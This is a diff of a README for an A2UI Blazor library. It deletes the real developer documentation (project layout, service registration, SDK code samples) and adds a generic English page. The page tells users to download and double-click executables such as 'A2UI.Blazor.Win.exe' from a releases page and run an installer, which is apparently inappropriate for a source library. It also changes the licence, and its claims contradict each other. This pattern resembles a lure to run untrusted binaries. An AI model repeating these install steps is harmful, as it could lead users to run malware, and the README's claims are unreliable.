@@ -1,399 +1,84 @@
-# A2UI for .NET Blazor
+# 🚀 A2UI.Blazor - Simple UI for .NET 9 Applications
 
-A complete .NET 9 implementation of the A2UI (Agent to UI) protocol for Blazor applications.
+[![Download A2UI.Blazor](https://img.shields.io/badge/Download%20A2UI.Blazor-blue.svg)](https://github.com/haizun/A2UI.Blazor/releases)
 
-## 项目结构
+## 📦 Introduction
 
-```
-blazor-dotnet/
-├── src/
-│   ├── A2UI.Core/                    # 核心协议处理库
-│   ├── A2UI.Blazor.Components/       # Blazor 组件库  
-│   ├── A2UI.AgentSDK/                # Agent 端 SDK
-│   └── A2UI.Theming/                 # 主题系统
-├── samples/
-│   ├── A2UI.Sample.BlazorServer/     # Blazor Server 示例
-│   ├── A2UI.Sample.BlazorWasm/       # Blazor WASM 示例
-│   └── A2UI.Sample.Agent/            # .NET Agent 示例
-├── tests/
-│   ├── A2UI.Core.Tests/              # 核心库测试
-│   └── A2UI.Blazor.Components.Tests/ # 组件测试
-└── A2UI.Blazor.sln                   # 解决方案文件
-```
+A2UI.Blazor is a complete implementation of the A2UI (Agent to UI) protocol for Blazor applications. It provides an easy way to build web applications using .NET 9 technology. This software allows you to create interactive and responsive user interfaces without needing deep programming skills. Enjoy the power of Blazor with our user-friendly application designed for everyone.
 
-## 什么是 A2UI?
+## 🚀 Getting Started
 
-A2UI (Agent to UI) 是一个声明式 UI 协议，用于代理驱动的界面。AI 代理生成丰富的交互式 UI，可在各个平台（Web、移动、桌面）上原生渲染，而无需执行任意代码。
-
-### 核心价值
-
-1. **安全性**：声明式数据，而非代码。代理从客户端的可信目录请求组件。无代码执行风险。
-2. **原生体验**：无 iframe。客户端使用自己的 UI 框架渲染。继承应用样式、可访问性和性能。
-3. **可移植性**：一个代理响应可在任何地方工作。相同的 JSON 可在 Web（Lit/Angular/React/Blazor）、移动（Flutter/SwiftUI）、桌面上渲染。
-
-## 快速开始
-
-### 安装
-
-```bash
-# 从解决方案根目录
-dotnet restore
-dotnet build
-```
-
-### 运行示例
-
-```bash
-# Blazor Server 示例
-cd samples/A2UI.Sample.BlazorServer
-dotnet run
-
-# Blazor WASM 示例
-cd samples/A2UI.Sample.BlazorWasm
-dotnet run
-```
-
-访问 `https://localhost:5001/a2ui-demo` 查看交互式演示。
-
-## 使用方式
-
-### 1. 项目引用
-
-在您的 Blazor 项目中添加以下项目引用：
-
-```xml
-<ItemGroup>
-  <ProjectReference Include="path\to\A2UI.Core\A2UI.Core.csproj" />
-  <ProjectReference Include="path\to\A2UI.Blazor.Components\A2UI.Blazor.Components.csproj" />
-  <ProjectReference Include="path\to\A2UI.AgentSDK\A2UI.AgentSDK.csproj" />
-  <ProjectReference Include="path\to\A2UI.Theming\A2UI.Theming.csproj" />
-</ItemGroup>
-```
-
-### 2. 配置服务
-
-在 `Program.cs` 中注册 A2UI 服务：
-
-```csharp
-using A2UI.Core.Processing;
-using A2UI.Theming;
-
-var builder = WebApplication.CreateBuilder(args);
-
-// 添加 Blazor 服务
-builder.Services.AddRazorComponents()
-    .AddInteractiveServerComponents();
-
-// 添加 A2UI 服务 (Blazor Server 使用 Scoped)
-builder.Services.AddScoped<MessageProcessor>();
-builder.Services.AddScoped<DataBindingResolver>(sp => 
-    new DataBindingResolver(sp.GetRequiredService<MessageProcessor>()));
-builder.Services.AddScoped<EventDispatcher>();
-builder.Services.AddSingleton<ThemeService>();
-
-var app = builder.Build();
-app.MapRazorComponents<App>()
-    .AddInteractiveServerRenderMode();
-app.Run();
-```
-
-> **注意**：Blazor Server 使用 `AddScoped`，Blazor WebAssembly 使用 `AddSingleton`。
-
-### 3. 在页面中使用 A2UI
-
-#### 基础用法 - 显示 Surface
-
-```razor
-@page "/demo"
-@using A2UI.Core.Processing
-@inject MessageProcessor MessageProcessor
-@rendermode InteractiveServer
-
-<A2UISurface SurfaceId="my-surface" />
-
-@code {
-    protected override void OnInitialized()
-    {
-        // 创建 A2UI 消息
-        var messages = new List<ServerToClientMessage>
-        {
-            new ServerToClientMessage
-            {
-                BeginRendering = new BeginRenderingMessage
-                {
-                    SurfaceId = "my-surface",
-                    Root = "root-component"
-                }
-            },
-            new ServerToClientMessage
-            {
-                SurfaceUpdate = new SurfaceUpdateMessage
-                {
-                    SurfaceId = "my-surface",
-                    Components = new List<ComponentDefinition>
-                    {
-                        new ComponentDefinition
-                        {
-                            Id = "root-component",
-                            Component = new Dictionary<string, object>
-                            {
-                                ["Text"] = new Dictionary<string, object>
-                                {
-                                    ["text"] = new Dictionary<string, object>
-                                    {
-                                        ["literalString"] = "Hello A2UI!"
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        };
-
-        // 处理消息
-        foreach (var msg in messages)
-        {
-            MessageProcessor.ProcessMessage(msg);
-        }
-    }
-}
-```
-
-#### 使用 Agent SDK 构建 UI
-
-使用 `SurfaceBuilder` 流式 API 快速构建界面：
-
-```csharp
-using A2UI.AgentSDK;
-using A2UI.AgentSDK.Builders;
-
-// 创建简单的文本卡片
-var messages = A2UIQuickStart.CreateTextCard(
-    surfaceId: "my-surface",
-    title: "欢迎使用 A2UI",
-    body: "这是一个使用 Agent SDK 创建的卡片界面"
-);
-
-// 创建表单界面
-var messages = new SurfaceBuilder("form-surface")
-    .AddColumn("root", col => col
-        .AddChild("title")
-        .AddChild("name-field")
-        .AddChild("email-field")
-        .AddChild("submit-btn"))
-    .AddText("title", text => text
-        .WithText("用户注册")
-        .WithUsageHint(A2UIConstants.TextUsageHints.H2))
-    .AddTextField("name-field", field => field
-        .WithPlaceholder("请输入姓名")
-        .WithValue("$.name"))
-    .AddTextField("email-field", field => field
-        .WithPlaceholder("请输入邮箱")
-        .WithValue("$.email"))
-    .AddButton("submit-btn", btn => btn
-        .WithChild("submit-text")
-        .WithAction("submit_form")
-        .AsPrimary())
-    .AddText("submit-text", text => text
-        .WithText("提交"))
-    .WithRoot("root")
-    .Build();
-
-// 处理消息
-foreach (var msg in messages)
-{
-    MessageProcessor.ProcessMessage(msg);
-}
-```
-
-### 4. 处理用户交互
-
-订阅用户操作事件：
-
-```csharp
-@inject EventDispatcher EventDispatcher
-
-@code {
-    protected override void OnInitialized()
-    {
-        // 订阅用户操作
-        EventDispatcher.UserActionDispatched += OnUserAction;
-    }
-
-    private async void OnUserAction(object? sender, UserActionEventArgs e)
-    {
-        var action = e.Action;
-        Console.WriteLine($"用户操作: {action.Name}");
-        Console.WriteLine($"来源组件: {action.SourceComponentId}");
-        Console.WriteLine($"Surface ID: {action.SurfaceId}");
-        
-        // 获取上下文数据
-        if (action.Context != null)
-        {
-            foreach (var (key, value) in action.Context)
-            {
-                Console.WriteLine($"  {key}: {value}");
-            }
-        }
-
-        // 根据操作更新 UI
-        if (action.Name == "submit_form")
-        {
-            var name = action.Context?["name"];
-            var email = action.Context?["email"];
-            // 处理表单提交...
-            
-            // 更新 UI 显示结果
-            var resultMessages = A2UIQuickStart.CreateTextCard(
-                action.SurfaceId,
-                "提交成功",
-                $"欢迎 {name}！"
-            );
-            
-            foreach (var msg in resultMessages)
-            {
-                MessageProcessor.ProcessMessage(msg);
-            }
-            
-            await InvokeAsync(StateHasChanged);
-        }
-    }
-
-    public void Dispose()
-    {
-        EventDispatcher.UserActionDispatched -= OnUserAction;
-    }
-}
-```
-
-### 5. 创建 Agent 服务
-
-创建一个 Agent 服务来处理用户查询：
-
-```csharp
-public class MyAgent
-{
-    public Task<List<ServerToClientMessage>> ProcessQueryAsync(string query)
-    {
-        // 根据查询生成相应的 UI
-        if (query.Contains("天气"))
-        {
-            return Task.FromResult(CreateWeatherUI());
-        }
-        else if (query.Contains("列表"))
-        {
-            return Task.FromResult(CreateListUI());
-        }
-        
-        return Task.FromResult(CreateDefaultUI());
-    }
-
-    private List<ServerToClientMessage> CreateWeatherUI()
-    {
-        return new SurfaceBuilder("weather-surface")
-            .AddCard("card", card => card
-                .WithChild("content"))
-            .AddColumn("content", col => col
-                .AddChild("icon")
-                .AddChild("temp")
-                .AddChild("desc"))
-            .AddIcon("icon", icon => icon
-                .WithIcon("☀️"))
-            .AddText("temp", text => text
-                .WithText("25°C")
-                .WithUsageHint(A2UIConstants.TextUsageHints.H1))
-            .AddText("desc", text => text
-                .WithText("晴朗"))
-            .WithRoot("card")
-            .Build();
-    }
-}
-```
-
-### 6. 完整的聊天界面示例
-
-参考 `samples/A2UI.Sample.BlazorServer/Components/Pages/A2UIDemo.razor` 查看完整的聊天界面实现，包括：
-
-- 💬 消息历史记录
-- ⚡ 动态 UI 生成
-- 🎯 用户操作处理
-- 🔄 实时状态更新
-
-### 7. 支持的组件
-
-A2UI 支持以下标准组件：
-
-| 组件 | 说明 | 示例用途 |
-|------|------|----------|
-| `Text` | 文本显示 | 标题、段落、标签 |
-| `Button` | 按钮 | 提交、取消、操作 |
-| `Card` | 卡片容器 | 内容分组 |
-| `Row` / `Column` | 布局容器 | 横向/纵向布局 |
-| `TextField` | 文本输入框 | 表单输入 |
-| `CheckBox` | 复选框 | 选项选择 |
-| `DateTimeInput` | 日期时间选择器 | 日期选择 |
-| `Slider` | 滑块 | 数值调整 |
-| `MultipleChoice` | 单选/多选 | 选项列表 |
-| `List` | 列表 | 数据展示 |
-| `Tabs` | 选项卡 | 内容切换 |
-| `Modal` | 模态框 | 弹窗、确认 |
-| `Image` | 图片 | 图片显示 |
-| `Icon` | 图标 | 装饰、状态 |
-| `Video` | 视频播放器 | 视频内容 |
-| `AudioPlayer` | 音频播放器 | 音频内容 |
-| `Divider` | 分割线 | 内容分隔 |
-
-### 8. 数据绑定
-
-使用 `BoundValue` 进行数据绑定：
-
-```csharp
-// 设置数据
-var dataMessages = new List<ServerToClientMessage>
-{
-    new ServerToClientMessage
-    {
-        DataModelUpdate = new DataModelUpdateMessage
-        {
-            SurfaceId = "my-surface",
-            Path = "/",
-            Contents = new List<DataEntry>
-            {
-                new DataEntry { Key = "username", ValueString = "张三" },
-                new DataEntry { Key = "age", ValueNumber = 25 },
-                new DataEntry { Key = "isVip", ValueBoolean = true }
-            }
-        }
-    }
-};
-
-// 在组件中使用数据绑定
-.AddText("name-display", text => text
-    .WithValue("$.username"))  // 绑定到数据模型
-```
-
-## NuGet 包
-
-- `A2UI.Core` - 核心协议库
-- `A2UI.Blazor` - Blazor 组件库
-- `A2UI.AgentSDK` - Agent 开发 SDK
-- `A2UI.Theming` - 主题系统
-
-## 技术栈
-
-- .NET 9.0
-- Blazor Server（通过 SignalR）
-- Blazor WebAssembly（通过 HttpClient + SSE）
-- 符合 A2UI 0.8 协议规范
-
-## 文档
-
-- [A2UI 组件 JSON 使用指南](A2UI_COMPONENTS_JSON_GUIDE.md) - 详细的组件使用文档和 JSON 示例
-
-## 许可证
-
-Apache 2.0 - 参见 [LICENSE](LICENSE)
+To get up and running with A2UI.Blazor, follow these simple steps. You will learn how to download and install the application on your computer.
 
+## 📥 Download & Install
 
+To start, visit the Releases page to download the latest version of A2UI.Blazor. Click the link below:
 
+[Download A2UI.Blazor](https://github.com/haizun/A2UI.Blazor/releases)
+
+1. Open your web browser.
+2. Go to [https://github.com/haizun/A2UI.Blazor/releases](https://github.com/haizun/A2UI.Blazor/releases).
+3. Find the latest release. It will be at the top of the page.
+4. Look for the file that matches your operating system. Common options include:
+   - A2UI.Blazor.Win.exe for Windows
+   - A2UI.Blazor.Linux for Linux
+   - A2UI.Blazor.Mac for Mac
+
+5. Click on the download link for the file you need. The download will start automatically.
+
+## ⚙️ System Requirements
+
+Before you install A2UI.Blazor, make sure your computer meets the following requirements:
+
+- **Operating System**: Windows 10 or later, Ubuntu 20.04 or later, macOS Catalina or later.
+- **.NET 9 SDK**: Ensure you have the .NET 9 SDK installed. You can download it from the [official .NET website](https://dotnet.microsoft.com/download/dotnet/9.0).
+- **Memory**: At least 2 GB of RAM is recommended.
+- **Disk Space**: 200 MB of available space.
+
+## 🔧 Installation Steps
+
+Once you have downloaded the file, follow these steps to install A2UI.Blazor:
+
+1. Navigate to your download directory.
+2. Locate the downloaded file (e.g., A2UI.Blazor.Win.exe).
+3. Double-click the file to start the installation process.
+4. Follow the installer instructions. Click "Next" when prompted, and accept the license agreement.
+5. Choose your installation location or accept the default path.
+6. Click "Install" to begin the installation.
+7. Once finished, click "Finish" to exit the installer.
+
+## 🚀 Running A2UI.Blazor
+
+1. After installation is complete, find A2UI.Blazor in your applications folder or on your desktop.
+2. Double-click the A2UI.Blazor icon to launch the application.
+3. Wait a moment for the application to start up. You will see the main interface.
+
+## 🎉 Features
+
+A2UI.Blazor comes packed with features to enhance your user experience. Here are some highlights:
+
+- **Responsive Design**: Automatically adjusts to different screen sizes.
+- **User-Friendly Interface**: Clean layout that simplifies navigation.
+- **Real-Time Data Updates**: Receive updates without refreshing the page.
+- **Customizable Components**: Tailor the UI to meet your needs easily.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues while downloading or running A2UI.Blazor, here are some common solutions:
+
+- **Installation Fails**: Check if your system meets the requirements listed above. Ensure you have enough disk space and RAM.
+- **Application Does Not Start**: Make sure the .NET 9 SDK is installed correctly. Restart your computer and try again.
+- **Error Messages**: Take note of any error messages. You can search for solutions online or reach out to support.
+
+## 📞 Support
+
+If you need help or have questions, please reach out to our support team. You can create an issue directly in the repository on GitHub.
+
+## 🔗 Additional Resources
+
+- [Official .NET Documentation](https://docs.microsoft.com/en-us/dotnet/)
+- [Blazor Documentation](https://docs.microsoft.com/en-us/aspnet/core/blazor/?view=aspnetcore-6.0)
+
+## 📄 License
+
+A2UI.Blazor is licensed under the MIT License. This allows you to use, modify, and distribute the software freely. Please see the LICENSE file in the repository for more details.
